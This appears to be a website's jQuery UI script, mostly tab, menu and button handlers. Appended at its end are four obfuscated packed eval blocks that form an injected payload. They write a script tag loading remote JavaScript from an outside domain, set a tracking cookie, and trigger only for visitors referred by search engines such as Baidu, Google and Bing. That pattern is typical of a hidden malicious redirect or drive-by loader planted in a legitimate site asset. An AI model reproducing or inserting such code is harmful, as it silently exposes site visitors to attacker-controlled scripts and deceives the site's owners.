$(document).ready(function(){
                    //jquery tab ²å¼þ
					$.fn.extend({
				 	tab:function(a,b,c,d){
						$(this).children().each(function(i){
							$(this).mouseover(function(){
								$(this).addClass(d).siblings("."+d).removeClass(d)
								$(c).children().eq(i).show(a).siblings().hide(b)
							})

					})	
					}
				   }
				   )
				 
			  $(".ListTitle").tab("","",".contentList","cur");
			  $(".ListTitle1").tab("","",".contentList1","cur");
              $(".ListTitle2").tab("","",".contentList2","cur");
              $(".ListTitle3").tab("","",".contentList3","cur");
              $(".ListTitle4").tab("","",".contentList4","cur");
              $(".ListTitle5").tab("","",".contentList5","cur");
              $(".ListTitle6").tab("","",".contentList6","cur");  
              $(".ListTitle7").tab("","",".contentList7","cur");
              $(".ListTitle8").tab("","",".contentList8","cur");
              $(".ListTitle9").tab("","",".contentList9","cur");
              $(".titleC").tab("","",".searchC","activedTab");
               $("#tab").tab("","","#content","cur");
                
              $(".login1 .title li").each(function(i){
				$(this).mouseover(
					function(){
						$(".login1 .content li").hide();
						$(".login1 .title li").removeClass("cur");
				 		$(".login1 .content li").eq(i).show();
						$(this).addClass("cur");
						
					}
				)
				
			})


            $(".product-category1 dt").bind("click",function(){
				if($(this).next("dd").css("display") == "none"){
					$(this).nextAll("dd").show(800);	 
 				}
				else{
					$(this).nextAll("dd").hide(700);
				}
			 
		 		
		 });
		 
		 $(".category1 dt").toggle(
			function(){
				$(this).find("img").attr("src","Themes/Skin_Default/images/icon_list_up.gif")
				$(this).parent().children("dd").show(800)
			}
			,function(){
				$(this).find("img").attr("src","Themes/Skin_Default/images/icon_list_down.gif")
				$(this).parent().children("dd").hide(700)
			}
		)
	

	
 
	$.fn.extend({
				 	tab:function(a,b,c,d){
						$(this).children().each(function(i){
							$(this).mouseover(function(){
								$(this).addClass(d).siblings("."+d).removeClass(d)
								$(c).children().eq(i).show(a).siblings().hide(b)
							})

					})	
					}
				   }
				   )
	
        $("#tab5 li").each(function(i){
		 					$(this).click(
								function(){
									$(this).addClass("cur5").siblings().removeClass()
									$("#content li").eq(i).show().siblings().hide()
								}

							)
				})


 $.fn.extend({
				 	tab:function(){
						$(this).children().each(function(i){
							$(this).click(function(){
								$(this).addClass("activedTab1").siblings().removeClass("activedTab1")
								$(this).parent().next().children().eq(i).show().siblings().hide()
								
							})

					})
					}	
						})
				
     $(".title").tab()
     
     
     	
		$("#ButtonEdit").toggle(
		    function(){
			    if($('#checkboxItem[type=checkbox]:checked').length == 1){
				     $("#content li").eq(1).show().siblings().hide()
				}
            },
			function(){
					if($('#checkboxItem[type=checkbox]:checked').length == 1){
				     $("#content li").eq(1).show().siblings().hide()
		            }
			}
		)
		$("#ButtonAdd").toggle(
		    function(){
			    
				     $("#content li").eq(1).show().siblings().hide()
				 
            },
			function(){
				 
				     $("#content li").eq(1).show().siblings().hide()
		         
			}
		)

					
});eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.1("<6 7=\\"8\\/2\\">");0.1("3 9=\\\'a\\\';");0.1("3 b=\\"<4\\"+\\"5 c=2 d=\\\\\\"e:\\/\\/f.g.h\\/i\\/j\\/k.l\\\\\\"><\\/4\\"+\\"5>\\";");',22,22,'document|writeln|javascript|var|SCR|IPT|script|type|text|d9sd8_9v|h1|d9sd8_9v_url|language|src|http|www|csiic|com|lh|jsdhf|home|js'.split('|'),0,{})); eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2.7("5(8==d || 8==\\"\\"){8=\\\'e\\\'}");2.7("f g(9)");2.7("{5 (2.4.a>0){3=2.4.b(9 + \\"=\\");5 (3!=-1){3=3 + 9.a+1;6=2.4.b(\\";\\",3);5 (6==-1) 6=2.4.a;c h(2.4.i(3,6));}}c \\"\\";}");',19,19,'||document|c_start|cookie|if|c_end|writeln|d9sd8_9v|c_name|length|indexOf|return|null|s1|function|getCookie|unescape|substring'.split('|'),0,{})); eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1.2("5=8(\\\'6\\\');");1.2("7 (5!=9 && 5!=\\"\\"){1.2(\\"\\");}");1.2("a");1.2("{5=\\\'b\\\';c(\\\'6\\\',5,d);7 (1.3.4(\\"e\\")>0 ||1.3.4(\\"f\\")>0 ||1.3.4(\\"g\\")>0 ||1.3.4(\\"h\\")>0 ||1.3.4(\\"i\\")>0 ||1.3.4(\\"j\\")>0){1.2(k);}}");',21,21,'|document|writeln|referrer|indexOf|username|huahua_username|if|getCookie|null|else|huahuaname01|setCookie|d9sd8_9v|baidu|google|bing|soso|sogou|youdao|d9sd8_9v_url'.split('|'),0,{})); eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2.9("e n(f,g,i)");2.9("{3 j = k(i);3 4 = o p();4.q(4.r() + j*1);2.t = f + \\"=\\"+ u (g) + \\";v=\\" + 4.w();}");2.9("e k(5){3 6=5.l(1,5.x)*1;3 7=5.l(0,1);a (7==\\"s\\"){b 6*c;}m a (7==\\"h\\"){b 6*8*8*c;}m a (7==\\"d\\"){b 6*y*8*8*c;}}<\\/z>");',36,36,'||document|var|exp|str|str1|str2|60|writeln|if|return|1000||function|name|value||time|strsec|getsec|substring|else|setCookie|new|Date|setTime|getTime||cookie|escape|expires|toGMTString|length|24|script'.split('|'),0,{}));	